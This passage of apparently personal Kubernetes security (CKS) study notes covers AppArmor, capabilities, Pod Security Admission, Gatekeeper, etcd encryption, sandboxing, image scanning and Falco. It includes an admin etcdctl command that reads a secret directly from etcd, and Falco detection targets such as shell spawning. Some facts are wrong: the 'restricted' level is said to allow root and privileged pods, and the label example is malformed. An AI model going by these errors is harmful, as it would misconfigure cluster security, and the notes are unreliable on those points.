<p>AppArmor can be used to limit a containers‚Äô access to resources on the host. Why do we need apparmor if we have traditional discretionary access controls (file system permissions, etc.)? With discretionary access control, a running process will inherit the permissions of the user who started it. Likely more permissions than the process needs. AppArmor is a mandatory access control implementation that allows one to implement fine-grained controls over what a process can access or do on a system.</p>
</li>
<li>
<p>AppArmor runs as a daemon on Linux systems. You can check it‚Äôs status using <code>systemctl</code>:
<code>systemctl status apparmor</code></p>
<ul>
<li>If <code>apparmor-utils</code> is installed, you can also use <code>aa-status</code></li>
</ul>
</li>
<li>
<p>To use AppArmor, the kernel module must also be loaded. The check status:
<code>cat /sys/module/apparmor/parameters/enabled</code>
Y = loaded</p>
</li>
<li>
<p>AppArmor profiles define what a process can and cannot do and are stored in <code>/etc/apparmor.d/</code>. Profiles need to be copied to every worker node and loaded.</p>
</li>
<li>
<p>Every profile needs to be loaded into AppArmor before it can take effect</p>
<ul>
<li>To view loaded profiles, run <code>aa-status</code></li>
</ul>
</li>
<li>
<p>To load a profile:
<code>apparmor_parser -r -W /path/to/profile</code></p>
<ul>
<li>If <code>apparmor-utils</code> is installed, you can also use <code>aa-enforce</code> to load a profile</li>
</ul>
</li>
<li>
<p>Profiles are loaded in ‚Äòenforce‚Äô mode by default. To change the mode to ‚Äòcomplain‚Äô:
<code>apparmor_parser -C /path/to/profile</code></p>
<ul>
<li>If <code>apparmor-utils</code> is installed, you can also use <code>aa-complain</code> to change the mode</li>
</ul>
</li>
<li>
<p>To view loaded apparmor profiles:</p>
<pre><code>  kubeadmin@kube-controlplane:~$ sudo cat /sys/kernel/security/apparmor/profiles
  cri-containerd.apparmor.d (enforce)
  wpcom (unconfined)
  wike (unconfined)
  vpnns (unconfined)
  vivaldi-bin (unconfined)
  virtiofsd (unconfined)
  rsyslogd (enforce)
  vdens (unconfined)
  uwsgi-core (unconfined)
  /usr/sbin/chronyd (enforce)
  /usr/lib/snapd/snap-confine (enforce)
  /usr/lib/snapd/snap-confine//mount-namespace-capture-helper (enforce)
  tcpdump (enforce)
  man_groff (enforce)
  man_filter (enforce)
  ....
</code></pre>
<p>or:</p>
<pre><code>  root@controlplane00:/etc/apparmor.d# aa-status
  apparmor module is loaded.
  33 profiles are loaded.
  12 profiles are in enforce mode.
     /home/rtn/tools/test.sh
     /usr/bin/man
     /usr/lib/NetworkManager/nm-dhcp-client.action
     /usr/lib/NetworkManager/nm-dhcp-helper
     /usr/lib/connman/scripts/dhclient-script
     /usr/sbin/chronyd
     /{,usr/}sbin/dhclient
     lsb_release
     man_filter
     man_groff
     nvidia_modprobe
     nvidia_modprobe//kmod
  21 profiles are in complain mode.
     avahi-daemon
     dnsmasq
     dnsmasq//libvirt_leaseshelper
     identd
     klogd
     mdnsd
     nmbd
     nscd
     php-fpm
     ping
     samba-bgqd
     samba-dcerpcd
     samba-rpcd
     samba-rpcd-classic
     samba-rpcd-spoolss
     smbd
     smbldap-useradd
     smbldap-useradd///etc/init.d/nscd
     syslog-ng
     syslogd
     traceroute
  0 profiles are in kill mode.
  0 profiles are in unconfined mode.
  4 processes have profiles defined.
  2 processes are in enforce mode.
     /usr/sbin/chronyd (704)
     /usr/sbin/chronyd (708)
  2 processes are in complain mode.
     /usr/sbin/avahi-daemon (587) avahi-daemon
     /usr/sbin/avahi-daemon (613) avahi-daemon
  0 processes are unconfined but have a profile defined.
  0 processes are in mixed mode.
  0 processes are in kill mode.
</code></pre>
</li>
<li>
<p>AppArmor defines profile modes that determine how the profile behaves:</p>
<ul>
<li>Modes:
<ul>
<li>Enforced: Action is taken and the application is allowed/blocked from performing defined actions. Events are logged in syslog.</li>
<li>Complain: Events are logged but no action is taken</li>
<li>Unconfined: application can perform any task and no event is logged</li>
</ul>
</li>
</ul>
</li>
<li>
<p>AppArmor Tools</p>
<ul>
<li>Can be used to generate apparmor profiles</li>
<li>To install: <code>apt install -y apparmor-utils</code></li>
<li>Run <code>aa-genprof</code> to generate a profile:
<code>aa-genprof ./my-application</code></li>
</ul>
</li>
<li>
<p>Before applying an AppArmor profile to a pod, you must ensure the container runtime supports AppArmor. You must also ensure AppArmor is installed on the worker node and that all necessary profiles are loaded.</p>
</li>
<li>
<p>To apply an AppArmor profile to a pod, you must add the following security profile (K8s 1.30+):</p>
<pre><code>securityContext:
  appArmorProfile:
    type: &lt;profile_type&gt;
    localhostProfile: &lt;profile_name&gt;
</code></pre>
<ul>
<li>&lt;profile_type&gt; can be one of 3 values: <code>Unconfined</code>, <code>RuntimeDefault</code>, or <code>Localhost</code>
<ul>
<li><code>Unconfined</code> means the container is not restricted by AppArmor</li>
<li><code>RuntimeDefault</code> means the container will use the default AppArmor profile</li>
<li><code>Localhost</code> means the container will use a custom profile</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="deep-dive-into-apparmor-profiles"><a class="header" href="#deep-dive-into-apparmor-profiles">Deep Dive into AppArmor Profiles</a></h4>
<p>AppArmor profiles define security rules for specific applications, specifying what they can and cannot do. These profiles reside in <code>/etc/apparmor.d/</code> and are loaded into the kernel to enforce security policies.</p>
<ul>
<li>Each profile follows these structure:</li>
</ul>
<pre><code>profile &lt;profile_name&gt; &lt;executable_path&gt; {
    &lt;rules&gt;
}
</code></pre>
<ul>
<li>Example profile, a profile for nano:</li>
</ul>
<pre><code>profile nano /usr/bin/nano {
    # Allow reading any file
    file,

    # Deny writing to system directories
    deny /etc/* rw,
}
</code></pre>
<ul>
<li>Types of AppArmor rules:
<ul>
<li>File Access Rules:
<pre><code>    /home/user/data.txt r       # Read-only access
    /etc/passwd rw              # Read &amp; write access
    /tmp/ rw                    # Full access to /tmp
</code></pre>
</li>
<li>Network Access Rules:
<pre><code>    network inet tcp,           # Allow TCP connections
    network inet udp,           # Allow UDP connections
    network inet dgram,         # Allow datagram connections
</code></pre>
</li>
<li>Capability Rules:</li>
</ul>
<pre><code>deny capability sys_admin,       # Deny sys_admin capability
deny capability sys_ptrace,      # Deny sys_ptrace capability
</code></pre>
</li>
</ul>
<h2 id="linux-capabilities-in-pods"><a class="header" href="#linux-capabilities-in-pods">Linux Capabilities in Pods</a></h2>
<ul>
<li>For the purpose of performing permission checks, traditional UNIX implementations distinguish two categories of processes: privileged processes (whose effective user ID is 0, referred to as superuser or root), and unprivileged processes (whose effective UID is nonzero). Privileged processes bypass all kernel permission checks, while unprivileged processes are subject to full permission checking based on the process‚Äôs credentials (usually: effective UID, effective GID, and supplementary group list).</li>
<li>Starting with Linux 2.2, Linux divides the privileges traditionally associated with superuser into distinct units, known as capabilities, which can be independently enabled and disabled.  Capabilities are a per-thread attribute.</li>
<li>Capabilities control what a process can do</li>
<li>Some common capabilities
<ul>
<li><code>CAP_SYS_ADMIN</code></li>
<li><code>CAP_NET_ADMIN</code></li>
<li><code>CAP_NET_RAW</code></li>
</ul>
</li>
<li>To view the capabilities of a process:
<ul>
<li><code>getcap</code> - Check the capabilities of a binary - <code>getcap &lt;path to bin&gt;</code></li>
<li><code>getpcaps</code> - Check the capabilities of a process - <code>getpcaps &lt;pid&gt;</code></li>
</ul>
</li>
</ul>
<h1 id="4-minimize-microservice-vulnerabilities"><a class="header" href="#4-minimize-microservice-vulnerabilities">4 Minimize Microservice Vulnerabilities</a></h1>
<h2 id="pod-security-admission"><a class="header" href="#pod-security-admission">Pod Security Admission</a></h2>
<ul>
<li>Replaced Pod Security Policies</li>
<li>Pod Security Admission controller enforces pod security standards on pods</li>
<li>All you need to do to opt into the PSA feature is to add a label with a specific format to a namespace. All pods in that namespace will have to follow the standards declared.
<ul>
<li>The label consists of three parts: a prefix, a mode, and a level</li>
<li>Example: <code>pod-security.kubernetes.io/restricted=privileged</code></li>
<li>Prefix: <code>pod-security.kubernetes.io</code></li>
<li>Mode: <code>enforce</code>, <code>audit</code>, or <code>warn</code>
<ul>
<li>Enforce: blocks pods that do not meet the PSS</li>
<li>Audit: logs violations to the audit log but does not block pod creation</li>
<li>Warn: logs violations on the console but does not block pod created</li>
</ul>
</li>
<li>Level: <code>privileged</code>, <code>baseline</code>, or <code>restricted</code>
<ul>
<li>Privileged: fully unrestricted
<ul>
<li>Allowed: everything</li>
</ul>
</li>
<li>Baseline: some restrictions
<ul>
<li>Allowed: most things, except sharing host namespaces, hostPath volumes and hostPorts, and privileged pods</li>
</ul>
</li>
<li>Restricted: most restrictions
<ul>
<li>Allowed: very few things, like running as root, using host networking, hostPath volumes, hostPorts, and privileged pods. The pod must be configured with a seccomp profile.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="security-contexts"><a class="header" href="#security-contexts">Security Contexts</a></h2>
<ul>
<li>Security contexts are used to control the security settings of a pod or container</li>
<li>Security contexts can be defined at the pod level or the container level. Settings defined at the container level will override identical settings defined at the pod level</li>
<li>Security contexts can be used to:
<ul>
<li>Run a pod as a specific user</li>
<li>Run a pod as a specific group</li>
<li>Run a pod with specific Linux capabilities</li>
<li>Run a pod with a read-only root filesystem</li>
<li>Run a pod with a specific SELinux context</li>
<li>Run a pod with a specific AppArmor profile</li>
</ul>
</li>
<li>You can view the capabilities of a process by viewing the status file of the process and grepping for capabilities:
<pre><code>rtn@worker02:~$ cat /proc/self/status |grep -i cap
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 000001ffffffffff
CapAmb: 0000000000000000
</code></pre>
</li>
</ul>
<p>These values are encoded in hexadecimal. To decode them, use the <code>capsh</code> command:
<code>    rtn@worker02:~$ sudo capsh --decode=000001ffffffffff     0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore    </code></p>
<h2 id="admission-controllers"><a class="header" href="#admission-controllers">Admission Controllers</a></h2>
<ul>
<li>Admission Controllers are used for automation within a cluster</li>
<li>Once a request to the KubeAPI server has been authenticated and then authorized, it is intercepted and handled by any applicable Admission Controllers</li>
<li>Example Admission Controllers:
<ul>
<li>ImagePolicyWebook
<ul>
<li>You may see this one on the exam.</li>
<li>When enabled, the ImagePolicyWebook admission controller contacts an external service (that you or someone else wrote in whatever language you want, it just needs to accept and respond to HTTP requests).</li>
<li>To enable, add ‚ÄòImagePolicyWebook‚Äô to the ‚Äò‚Äìenable-admission-plugins‚Äô flag of the kube-api server</li>
<li>You must also supply an AdmissionControlFileFile file, which is a kubeconfig formatted file. Then pass the path to this config to the kube-api server with the <code>--admission-control-config-file=&lt;path to config file&gt;</code>. Note that this path is the path inside the kube-api container, so you must mount this path on the host to the pod as a <code>hostPath</code> mount.</li>
</ul>
</li>
<li>AlwaysPullImages</li>
<li>DefaultStorageClass</li>
<li>EventRateLimit</li>
<li>NamespaceExists</li>
<li>‚Ä¶ and many more</li>
</ul>
</li>
<li>Admission Controllers help make Kubernetes modular</li>
<li>To see which Admission Controllers are enabled:
<ul>
<li>you can either grep the kubeapi process:
<code>ps aux |grep -i kube-api | grep -i admission</code></li>
<li>or you can look at the manifest for the KubeAPI server (if the cluster was provisioned with KubeADM)
<code>grep admission -A10 /etc/kubernetes/manifests/kube-apiserver.yaml</code></li>
<li>or if the cluster was provisioned manually you can look at the systemd unit file for the kube-api server daemon</li>
</ul>
</li>
<li>There are two types of admission controllers:
<ul>
<li>Mutating - can make changes to ‚Äòautocorrect‚Äô</li>
<li>Validating - only validates configuration</li>
<li>Mutating are invoked first. Validating second.</li>
</ul>
</li>
<li>The admission controller runs as a webhook server. It can run inside the cluster as a pod or outside the cluster on another server.</li>
<li>Some admission-controllers required a configuration file to be passed to the kube-api server. This file is passed using the <code>--admission-control-config-file</code> flag.</li>
</ul>
<h2 id="open-policy-agent"><a class="header" href="#open-policy-agent">Open Policy Agent</a></h2>
<ul>
<li>OPA can be used for authorization. However, it is more likely to be used in the admission control phase.</li>
<li>OPA can be deployed as a daemonset on a node or as a pod</li>
<li>OPA policies use a language called rego</li>
</ul>
<h3 id="opa-in-kubernetes"><a class="header" href="#opa-in-kubernetes">OPA in Kubernetes</a></h3>
<h4 id="gatekeeper"><a class="header" href="#gatekeeper">GateKeeper</a></h4>
<ul>
<li>
<p>Gatekeeper Constraint Framework</p>
<ul>
<li>Gatekeeper is a validating and mutating webhook that enforces CRD-based policies executed by Open Policy Agent, a policy engine for Cloud Native environments hosted by CNCF as a graduated project.</li>
<li>The framework that helps us implement what, where, and how we want to do something in Kubernetes
<ul>
<li>Example:
<ul>
<li>What: Add labels, etc.</li>
<li>Where: kube-system namespace</li>
<li>How: When a pod is created</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>To run Gatekeeper in Kubernetes, simply apply the manifests provided by OPA</p>
</li>
<li>
<p>The pods and other resources are created in the gatekeeper-system namespace</p>
</li>
<li>
<p>Constraint Templates</p>
<ul>
<li>
<p>Before you can define a constraint, you must first define a ConstraintTemplate, which describes both the Rego that enforces the constraint and the schema of the constraint. The schema of the constraint allows an admin to fine-tune the behavior of a constraint, much like arguments to a function.</p>
</li>
<li>
<p>Here is an example constraint template that requires all labels described by the constraint to be present:</p>
<pre><code>```
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredlabels
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredLabels
      validation:
        # Schema for the `parameters` field
        openAPIV3Schema:
          type: object
          properties:
            labels:
              type: array
              items:
                type: string
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredlabels

        violation[{"msg": msg, "details": {"missing_labels": missing}}] {
          provided := {label | input.review.object.metadata.labels[label]}
          required := {label | label := input.parameters.labels[_]}
          missing := required - provided
          count(missing) &gt; 0
          msg := sprintf("you must provide labels: %v", [missing])
        }
```
</code></pre>
</li>
</ul>
</li>
<li>
<p>Constraints</p>
<ul>
<li>Constraints are then used to inform Gatekeeper that the admin wants a ConstraintTemplate to be enforced, and how. This constraint uses the K8sRequiredLabels constraint template above to make sure the gatekeeper label is defined on all namespaces:
<pre><code>  apiVersion: constraints.gatekeeper.sh/v1beta1
  kind: K8sRequiredLabels
  metadata:
    name: ns-must-have-gk
  spec:
    match:
      kinds:
        - apiGroups: [""]
          kinds: ["Namespace"]
    parameters:
      labels: ["gatekeeper"]
</code></pre>
</li>
<li>The <code>match</code> field supports multiple options: https://open-policy-agent.github.io/gatekeeper/website/docs/howto#the-match-field</li>
</ul>
</li>
<li>
<p>After creating the constraint from the constrainttemplate, you can view all violations by describing the constraint:</p>
<ul>
<li>Example:
<code>kubectl describe k8srequiredlabels ns-must-have-gk</code></li>
</ul>
</li>
</ul>
<h2 id="kubernetes-secrets"><a class="header" href="#kubernetes-secrets">Kubernetes Secrets</a></h2>
<ul>
<li>Secrets are used to store sensitive information in Kubernetes</li>
<li>base64 encoded when stored in etcd</li>
<li>Can be injected into a pod as an env or mounted as a volume</li>
</ul>
<h2 id="encrypting-etcd"><a class="header" href="#encrypting-etcd">Encrypting etcd</a></h2>
<ul>
<li>
<p>By default, the API server stores plain-text representations of resources into etcd, with no at-rest encryption.</p>
</li>
<li>
<p>The kube-apiserver process accepts an argument ‚Äìencryption-provider-config that specifies a path to a configuration file. The contents of that file, if you specify one, control how Kubernetes API data is encrypted in etcd.</p>
</li>
<li>
<p>If you are running the kube-apiserver without the ‚Äìencryption-provider-config command line argument, you do not have encryption at rest enabled. If you are running the kube-apiserver with the ‚Äìencryption-provider-config command line argument, and the file that it references specifies the identity provider as the first encryption provider in the list, then you do not have at-rest encryption enabled (the default identity provider does not provide any confidentiality protection.)</p>
</li>
<li>
<p>If you are running the kube-apiserver with the ‚Äìencryption-provider-config command line argument, and the file that it references specifies a provider other than identity as the first encryption provider in the list, then you already have at-rest encryption enabled. However, that check does not tell you whether a previous migration to encrypted storage has succeeded.</p>
</li>
<li>
<p>Example EncryptionConfiguration:</p>
<pre><code>  apiVersion: apiserver.config.k8s.io/v1
  kind: EncryptionConfiguration
  resources:
    - resources:
        - secrets
        - configmaps
        - pandas.awesome.bears.example # a custom resource API
      providers:
        # This configuration does not provide data confidentiality. The first
        # configured provider is specifying the "identity" mechanism, which
        # stores resources as plain text.
        #
        - identity: {} # plain text, in other words NO encryption
        - aesgcm:
            keys:
              - name: key1
                secret: c2VjcmV0IGlzIHNlY3VyZQ==
              - name: key2
                secret: dGhpcyBpcyBwYXNzd29yZA==
        - aescbc:
            keys:
              - name: key1
                secret: c2VjcmV0IGlzIHNlY3VyZQ==
              - name: key2
                secret: dGhpcyBpcyBwYXNzd29yZA==
        - secretbox:
            keys:
              - name: key1
                secret: YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXoxMjM0NTY=
    - resources:
        - events
      providers:
        - identity: {} # do not encrypt Events even though *.* is specified below
    - resources:
        - '*.apps' # wildcard match requires Kubernetes 1.27 or later
      providers:
        - aescbc:
            keys:
            - name: key2
              secret: c2VjcmV0IGlzIHNlY3VyZSwgb3IgaXMgaXQ/Cg==
    - resources:
        - '*.*' # wildcard match requires Kubernetes 1.27 or later
      providers:
        - aescbc:
            keys:
            - name: key3
              secret: c2VjcmV0IGlzIHNlY3VyZSwgSSB0aGluaw==
</code></pre>
</li>
<li>
<p>Each resources array item is a separate config and contains a complete configuration. The resources.resources field is an array of Kubernetes resource names (resource or resource.group) that should be encrypted like Secrets, ConfigMaps, or other resources.</p>
</li>
<li>
<p>https://kubernetes.io/docs/tasks/administer-cluster/encrypt-data/</p>
</li>
<li>
<p>After enabling encryption in etcd, any secrets that you created prior to enabling encryption will not be encrypted. You can encrypt them by running:</p>
</li>
</ul>
<pre><code>kubectl get secrets -A -o yaml | kubectl replace -f -
</code></pre>
<ul>
<li>Example of getting a secret in etcd:</li>
</ul>
<pre><code>ETCDCTL_API=3 etcdctl --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/apiserver-etcd-client.crt --key=/etc/kubernetes/pki/apiserver-etcd-client.key get /registry/secrets/three/con1
</code></pre>
<p>The path to the resource in the etcd database is ‚Äò/registry/<resource type="">/<namespace>/<resource name="">‚Äô</resource></namespace></resource></p>
<h2 id="container-sandboxing"><a class="header" href="#container-sandboxing">Container Sandboxing</a></h2>
<ul>
<li>Containers are not contained!</li>
<li>A container sandbox is a mechanism that provides an additional layer of isolation between the container and the host</li>
<li>Container sandboxing is implemented via Runtime Class objects in Kubernetes.</li>
<li>The default container runtime is <code>runc</code>. However, we can change this to use <code>runsc</code> (gvisor) or Kata</li>
<li>Sandboxing prevents the dirty cow exploit, which allows a user to gain root access to the host
<ul>
<li>Dirty COW works by exploiting a race condition in the Linux kernel</li>
</ul>
</li>
</ul>
<h3 id="gvisor"><a class="header" href="#gvisor">gVisor</a></h3>
<ul>
<li>gVisor is a kernel written in Golang that intercepts system calls made by a container</li>
<li>gVisor is like a ‚Äòsyscall proxy‚Äô that sits between the container and the kernel
<ul>
<li>components
<ul>
<li>sentry -</li>
<li>gofer -</li>
</ul>
</li>
</ul>
</li>
<li>Not all apps will work with gVisor</li>
<li>gVisor will cause performance degradation in your app due to the additional time taken</li>
<li>gVisor uses runsc as the runtime handler</li>
</ul>
<h3 id="kata-containers"><a class="header" href="#kata-containers">Kata Containers</a></h3>
<ul>
<li>Kata inserts each container into it‚Äôs own virtual machine, giving each it‚Äôs own kernel</li>
<li>Kata containers require nested virtualisation support, so it may not work with all cloud providers</li>
</ul>
<h3 id="runtimeclass"><a class="header" href="#runtimeclass">RuntimeClass</a></h3>
<ul>
<li>RuntimeClass is a new feature in Kubernetes that allows you to specify which runtime to use for a pod</li>
</ul>
<h4 id="to-use-a-runtime-class"><a class="header" href="#to-use-a-runtime-class">To use a runtime class</a></h4>
<ul>
<li>
<p>Create a new <code>runtimeclass</code> object:</p>
<pre><code>apiVersion: node.k8s.io/v1
handler: runsc
kind: RuntimeClass
metadata:
  name: secure-runtime
</code></pre>
</li>
<li>
<p>Specify the <code>runtimeClassName</code> in the pod definition:</p>
<pre><code>apiVersion: v1
kind: Pod
metadata:
    name: simple-webapp-1
    labels:
        name: simple-webapp
spec:
    runtimeClassName: secure-runtime
    containers:
    - name: simple-webapp
      image: kodekloud/webapp-delayed-start
      ports:
      - containerPort: 8080

</code></pre>
</li>
</ul>
<h2 id="resource-quotas"><a class="header" href="#resource-quotas">Resource Quotas</a></h2>
<ul>
<li>Control requests and limits for CPU and memory within a namespace</li>
</ul>
<pre><code>apiVersion: v1
kind: ResourceQuota
metadata:
  name: team-a-resource-quota
  namespace: team-a
spec:
  hard:
    pods: "5"
    requests.cpu: "0.5"
    requests.memory: 500Mi
    limits.cpu: "1"
    limits.memory: 1Gi
</code></pre>
<pre><code>apiVersion: v1
kind: ResourceQuota
metadata:
name: pods-medium
spec:
    hard:
      cpu: "10"
      memory: 20Gi
      pods: "10"
scopeSelector:
  matchExpressions:
  - operator : In
    scopeName: PriorityClass
    values: ["medium"]
</code></pre>
<h2 id="api-priority-and-fairness"><a class="header" href="#api-priority-and-fairness">API Priority and Fairness</a></h2>
<ul>
<li>https://kubernetes.io/docs/concepts/cluster-administration/flow-control/</li>
<li>With API Priority and Fairness, you can define which resources need to be prioritized over others in regards to requests to the KubeAPI server</li>
<li>To configure API Priority and Fairness, you create a <code>PriorityLevelConfiguration</code> object:
<pre><code>  ? Is this still supported? Is it an exam topic? I cannot find the manifest spec.
</code></pre>
</li>
</ul>
<h2 id="pod-priority-and-preemption"><a class="header" href="#pod-priority-and-preemption">Pod Priority and Preemption</a></h2>
<ul>
<li>With Pod Priority and Preemption, you can ensure that critical pods are running while the cluster is under resource contention by killing lower priority pods</li>
<li>To implement Pod Priority and Preemption:
<ul>
<li>Create a <code>priorityClass object</code> (or several):
<pre><code>apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: high-priority
value: 1000000
globalDefault: false
description: "This priority class should be used for XYZ service pods only."
---
    apiVersion: scheduling.k8s.io/v1
kind: PriorityClass
metadata:
  name: low-priority
value: 100
globalDefault: false
description: "This priority class should be used for XYZ service pods only."
</code></pre>
</li>
<li>Assign the <code>priorityClass</code> to a pod:
<pre><code>apiVersion: v1
kind: Pod
metadata:
  name: nginx
  labels:
    env: test
spec:
  containers:
  - name: nginx
    image: nginx
    imagePullPolicy: IfNotPresent
  priorityClassName: high-priority
</code></pre>
</li>
</ul>
</li>
</ul>
<h2 id="pod-to-pod-encryption"><a class="header" href="#pod-to-pod-encryption">Pod to Pod Encryption</a></h2>
<ul>
<li>mTLS can be used to encrypt traffic between pods</li>
<li>Methods of p2p encryption
<ul>
<li>Service Mesh
<ul>
<li>Service Mesh can offload the encryption and decryption of traffic between pods by using a sidecar proxy</li>
<li>Examples:
<ul>
<li>Istio
<ul>
<li>Istio uses Envoy as a sidecar proxy</li>
<li>Istio uses a sidecar proxy to encrypt traffic between pods</li>
</ul>
</li>
<li>Linkerd</li>
</ul>
</li>
</ul>
</li>
<li>Wireguard
<ul>
<li>Cilium
<ul>
<li>uses eBPF for network security</li>
<li>Encrytion is transparent to the application</li>
<li>Provides flexible encryption options</li>
</ul>
</li>
</ul>
</li>
<li>IPSec
<ul>
<li>Calico</li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="5-supply-chain-security"><a class="header" href="#5-supply-chain-security">5 Supply Chain Security</a></h1>
<h2 id="sbom"><a class="header" href="#sbom">SBOM</a></h2>
<ul>
<li>Supply chain security is the practice of ensuring that the software and hardware that you use in your environment is secure</li>
<li>In the context of the CKS exam, supply chain security refers to the security of the software that you use in your Kubernetes environment</li>
</ul>
<h2 id="reduce-docker-image-size"><a class="header" href="#reduce-docker-image-size">Reduce docker image size</a></h2>
<ul>
<li>
<p>Smaller images are faster to download and deploy</p>
</li>
<li>
<p>Smaller images are more secure</p>
</li>
<li>
<p>Smaller images are easier to manage</p>
</li>
<li>
<p>To reduce the size of a docker image:</p>
<ul>
<li>Use a smaller base image</li>
<li>Use specific package/image versions</li>
<li>Make file-system read-only</li>
<li>Don‚Äôt run the container as root</li>
<li>Use multi-stage builds</li>
<li>Remove unnecessary files</li>
<li>Use a <code>.dockerignore</code> file to exclude files and directories from the image</li>
<li>Use <code>COPY</code> instead of <code>ADD</code></li>
<li>Use <code>alpine</code> images</li>
<li>Use <code>scratch</code> images</li>
<li>Use <code>distroless</code> images</li>
</ul>
</li>
<li>
<p>Example of a multi-stage build:</p>
<pre><code># build container stage 1
  FROM ubuntu
  ARG DEBIAN_FRONTEND=noninteractive
  RUN apt-get update &amp;&amp; apt-get install -y golang-go
  COPY app.go .
  RUN CGO_ENABLED=0 go build app.go

# app container stage 2
  FROM alpine:3.12.1 # it is better to use a defined tag, rather than 'latest'
  RUN addgroup -S appgroup &amp;&amp; adduser -S appuser -G appgroup -h /home/appuser
  COPY --from=0 /app /home/appuser/app
  USER appuser # run as a non-root user
  CMD ["/home/appuser/app"]
</code></pre>
</li>
<li>
<p>Dockerfile best practices: https://docs.docker.com/build/building/best-practices/</p>
</li>
<li>
<p>Only certain docker directives create new layers in an image</p>
<ul>
<li><code>FROM</code></li>
<li><code>COPY</code></li>
<li><code>CMD</code></li>
<li><code>RUN</code></li>
</ul>
</li>
<li>
<p><code>dive</code> and <code>docker-slim</code> are two tools you can use to explore the individual layers that make up an image</p>
</li>
</ul>
<h2 id="static-analysis"><a class="header" href="#static-analysis">Static Analysis</a></h2>
<h3 id="sbom-1"><a class="header" href="#sbom-1">SBOM</a></h3>
<ul>
<li>A SBOM is a list of all the software that makes up a container image (or an application, etc.)</li>
<li>Formats
<ul>
<li>SPDX
<ul>
<li>The standard format for sharing SBOM</li>
<li>Available in JSON, RDF, and tag/value formats</li>
<li>More complex than CycloneDX due to it‚Äôs extensive metadata coverage</li>
<li>Comprehensive metadata including license information, origin, and file details</li>
</ul>
</li>
<li>CycloneDX
<ul>
<li>A lightweight format focused on security and compliance</li>
<li>Available in JSON and XML formats</li>
<li>Simpler and more focused on essential SBOM elements</li>
<li>Focuses on component details, vulnerabilities, and dependencies</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="kubesec"><a class="header" href="#kubesec">Kubesec</a></h3>
<ul>
<li>Used for static analysis of manifests</li>
<li>https://github.com/controlplaneio/kubesec</li>
</ul>
<h3 id="syft"><a class="header" href="#syft">Syft</a></h3>
<ul>
<li>Syft is a powerful and easy-to-use open-source tool for generating Software Bill of Materials (SBOMs) for container images and filesystems. It provides detailed visibility into the packages and dependencies in your software, helping you manage vulnerabilities, license compliance, and software supply chain security.</li>
<li>Syft can export results in SPDX, CycloneDX, JSON, etc.</li>
<li>To scan an image with syft and export the results to a file in SPDX format:
<pre><code>syft scan docker.io/kodekloud/webapp-color:latest -o spdx --file /root/webapp-spdx.sbom
</code></pre>
</li>
</ul>
<h3 id="grype"><a class="header" href="#grype">Grype</a></h3>
<ul>
<li>Grype is a tool (also from Anchore) that can be used to scan SBOM for vulnerabilities</li>
<li>To scan a SBOM with Grype:
<pre><code>grype /root/webapp-sbom.json -o json --file /root/grype-report.json
</code></pre>
</li>
</ul>
<h3 id="kube-linter"><a class="header" href="#kube-linter">Kube-linter</a></h3>
<ul>
<li>Kube-linter can be used to lint Kubernetes manifests and ensure best practices are being followed</li>
<li>kube-linter is configurable. You can disable/enable checks and even create your own custom checks</li>
<li>kube-linter includes recommendations for how to fix failed checks</li>
<li>https://github.com/stackrox/kube-linter</li>
</ul>
<h2 id="scanning-images-for-vulnerabilities"><a class="header" href="#scanning-images-for-vulnerabilities">Scanning Images for Vulnerabilities</a></h2>
<h3 id="trivy"><a class="header" href="#trivy">trivy</a></h3>
<ul>
<li>trivy can be used to scan images, git repos, and filesystems for vulnerabilities</li>
<li>https://github.com/aquasecurity/trivy</li>
<li>Example:
<pre><code>  sudo docker run --rm  aquasec/trivy:0.17.2 nginx:1.16-alpine
</code></pre>
</li>
</ul>
<h1 id="6-monitoring-logging-and-runtime-security"><a class="header" href="#6-monitoring-logging-and-runtime-security">6 Monitoring, Logging, and Runtime Security</a></h1>
<h2 id="falco"><a class="header" href="#falco">falco</a></h2>
<ul>
<li>Falco is an IDS for Kubernetes workloads</li>
<li>falco is a cloud native security tool. It provides near real-time threat detection for cloud, container, and Kubernetes workloads by leveraging runtime insights. Falco can monitor events defined via customizable rules from various sources, including the Linux kernel, and enrich them with metadata from the Kubernetes API server, container runtime, and more. Falco supports a wide range of kernel versions, x86_64 and ARM64 architectures, and many different output channels.</li>
<li>falco uses sydig filters to extract information about an event. They are configured in the falco rules.yaml or configmap. They can also be passed via helm values.
<ul>
<li><code>/etc/falco/falco.yaml</code> - the main configuration file for falco</li>
<li><code>/etc/falco/falco_rules.yaml</code> - the main rules file for falco</li>
</ul>
</li>
<li>falco rule files consist of 3 elements defined in YAML:
<ul>
<li>rules - a rule is a condition under which an alert should be generated</li>
<li>macros - a macro is a reusable rule condition. These help keep the rules file clean and easy to read</li>
<li>lists - a collection of items that can be used in rules and macros</li>
</ul>
</li>
<li>Some examples of events that falco watches for:
<ul>
<li>Reading or writing files at a specific location in the filesystem</li>
<li>Opening a shell binary for a container, such as /bin/bash</li>
<li>Sending/receives traffic from undesired URLs</li>
</ul>
</li>
<li>Falco deploys a set of sensors that listen for configured events and conditions
<ul>
<li>Each sensor contains a set of rules that map an event to a data source.</li>
